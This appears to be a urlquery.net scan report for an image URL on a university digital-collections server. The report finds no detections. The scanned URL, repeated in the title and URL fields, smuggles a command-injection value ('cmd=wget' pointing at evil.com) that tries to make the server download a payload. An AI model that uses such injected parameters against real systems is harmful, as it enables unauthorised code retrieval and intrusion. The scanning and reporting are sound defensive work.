@@ -1,0 +1,187 @@
+Source: https://urlquery.net/report/68379c29-56b9-4e72-8c3c-c70c0a4dc153
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+Report - nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20http://evil.com/a&tok=expt3
+ urlquery
+
+ Home  Search  Insights About
+Login
+
+ Check icon
+
+ Warning icon
+
+ Warning icon
+
+Share Report
+
+Generates a temporary link to share non-public report for a limited time.
+
+Valid for (hours 1-300) 
+
+Generate Link
+
+urlquery report
+
+JSON report
+
+Raw JSON report
+
+Share report
+
+Share a non-public report with others
+
+Request review
+
+Request a review of report
+
+External sources
+
+ VirusTotal
+
+VirusTotal
+
+FQDN
+
+nmdigital.unm.edu
+
+DOMAIN
+
+unm.edu
+
+IP
+
+132.174.3.1
+
+ crt.sh
+
+crt.sh
+
+FQDN
+
+nmdigital.unm.edu
+
+DOMAIN
+
+unm.edu
+
+Report Overview
+
+Visitedpublic 
+
+2026-05-26 11:20:32
+
+Tags
+
+Submit Tags
+
+URL
+
+nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20http://evil.com/a&tok=expt3
+
+Finishing URL
+
+nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20evil.com/a&tok=expt3
+
+IP / ASN
+
+132.174.3.1
+
+#4373 OCLC-AS
+
+Title
+
+default.jpg (JPEG Image, 1100 × 200 pixels)
+
+Detections
+
+urlquery
+
+0
+
+Network Intrusion Detection
+
+0
+
+Threat Detection Systems
+
+0
+
+Host Summary
+
+HostRankRegisteredFirst SeenLast SeenSentReceivedIPFingerprints
+
+nmdigital.unm.edu 
+unknown1986-08-272019-12-172026-05-252.6 kB61 kB
+
+132.174.3.1
+
+PHP (Programming languages)
+PHP is a general-purpose scripting language used for web development.
+
+Java (Programming languages)
+Java is a class-based, object-oriented programming language that is designed to have as few implementation dependencies as possible.
+
+Related reports
+
+Domain
+
+IP
+
+ASN
+
+Screenshot
+
+Similar
+
+Threat Detection Systems
+
+No alerts detected
+
+JavaScript (0)
+
+Script (0)
+
+Eval (0)
+
+Write (0)
+
+Filter scripts by metadata or content (case-insensitive)
+
+Loading...
+
+No JavaScripts
+
+HTTP Transactions (3)
+
+Filter transactions by metadata or HTML content (case-insensitive)
+
+URLIPResponseSize
+
+ urlquery
+urlquery is a service for URL and domain scanning, identifying and categorizing  potentially harmful elements on a webpage, checking for malware infections and assessing overall reputation.
+
+Powered by penguins.
+
+Contact
+
+General questions, feedback, or technical inquiries:
+📧 contact@urlquery.net
+
+Report phishing:
+📧 phishing@urlquery.net
+
+For abuse or removal requests:
+📧 support@urlquery.net
+
+Follow us
+
+Github
+
+Legal
+
+Privacy Policy
+
+Terms & Conditions
+
+© 2026 urlquery All Rights Reserved.
